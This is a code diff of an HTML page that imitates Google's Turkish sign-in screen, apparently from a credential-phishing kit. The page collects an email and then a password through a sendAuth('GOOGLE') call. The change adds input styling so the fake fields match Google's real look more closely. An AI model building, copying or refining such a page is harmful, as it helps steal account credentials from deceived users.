@@ -272,37 +272,41 @@
                 </div>
 
                 <div id="google-screen" class="g-card" style="display:none;">
-                    <div class="g-logo-container">
-                        <img class="g-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-                    </div>
-                    <div id="g-step1">
-                        <h1 class="g-h1">Oturum açın</h1>
-                        <p class="g-p">Google Hesabınızı kullanın</p>
-                        <div class="g-input-wrapper">
-                            <input type="email" id="g_email" class="g-input" placeholder="E-posta veya telefon">
-                        </div>
-                        <div style="text-align: left;"><span class="g-link">E-postanızı mı unuttunuz?</span></div>
-                        <div style="text-align: left; margin-top: 32px; color: #5f6368; font-size: 14px; line-height: 1.4;">
-                            Bilgisayar sizin değil mi? Güvenli bir şekilde oturum açmak için Misafir modunu kullanın. <span class="g-link">Daha fazla bilgi edinin</span>
-                        </div>
-                        <div class="g-footer-btns">
-                            <span class="g-create-acc">Hesap oluşturun</span>
-                            <button class="g-next" onclick="gNext()">İleri</button>
-                        </div>
-                    </div>
-                    <div id="g-step2" style="display:none; animation: fadeIn 0.4s ease;">
-                        <div id="disp_email" style="font-size:14px; border:1px solid #dadce0; border-radius:20px; padding:4px 12px; display:inline-flex; align-items:center; gap:8px; margin-bottom:24px; color:#3c4043; font-weight:500;"></div>
-                        <h1 class="g-h1">Hoş geldiniz</h1>
-                        <p class="g-p">Şifrenizi girin</p>
-                        <div class="g-input-wrapper">
-                            <input type="password" id="g_pass" class="g-input" placeholder="Şifreniz">
-                        </div>
-                        <div style="text-align: left; margin-top: 8px;"><span class="g-link">Şifrenizi mi unuttunuz?</span></div>
-                        <div class="g-footer-btns" style="justify-content: flex-end;">
-                            <button class="g-next" onclick="sendAuth('GOOGLE')">Giriş Yap</button>
-                        </div>
-                    </div>
-                </div>
+    <div class="g-logo-container">
+        <img class="g-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+    </div>
+    
+    <div id="g-step1">
+        <h1 class="g-h1">Oturum açın</h1>
+        <p class="g-p">Google Hesabınızı kullanın</p>
+        <div class="g-input-wrapper">
+            <input type="email" id="g_email" class="g-input" placeholder="E-posta veya telefon" 
+                   style="background: white !important; color: #202124 !important; border: 1px solid #dadce0 !important;">
+        </div>
+        <div style="text-align: left;"><span class="g-link">E-postanızı mı unuttunuz?</span></div>
+        <div style="text-align: left; margin-top: 32px; color: #5f6368; font-size: 14px; line-height: 1.4;">
+            Bilgisayar sizin değil mi? Güvenli bir şekilde oturum açmak için Misafir modunu kullanın. <span class="g-link">Daha fazla bilgi edinin</span>
+        </div>
+        <div class="g-footer-btns">
+            <span class="g-create-acc">Hesap oluşturun</span>
+            <button class="g-next" onclick="gNext()">İleri</button>
+        </div>
+    </div>
+
+    <div id="g-step2" style="display:none; animation: fadeIn 0.4s ease;">
+        <div id="disp_email" style="font-size:14px; border:1px solid #dadce0; border-radius:20px; padding:4px 12px; display:inline-flex; align-items:center; gap:8px; margin-bottom:24px; color:#3c4043; font-weight:500;"></div>
+        <h1 class="g-h1">Hoş geldiniz</h1>
+        <p class="g-p">Şifrenizi girin</p>
+        <div class="g-input-wrapper">
+            <input type="password" id="g_pass" class="g-input" placeholder="Şifreniz" 
+                   style="background: white !important; color: #202124 !important; border: 1px solid #dadce0 !important;">
+        </div>
+        <div style="text-align: left; margin-top: 8px;"><span class="g-link">Şifrenizi mi unuttunuz?</span></div>
+        <div class="g-footer-btns" style="justify-content: flex-end;">
+            <button class="g-next" onclick="sendAuth('GOOGLE')">Giriş Yap</button>
+        </div>
+    </div>
+</div>
 
                 <script>
                     function showGoogle() {
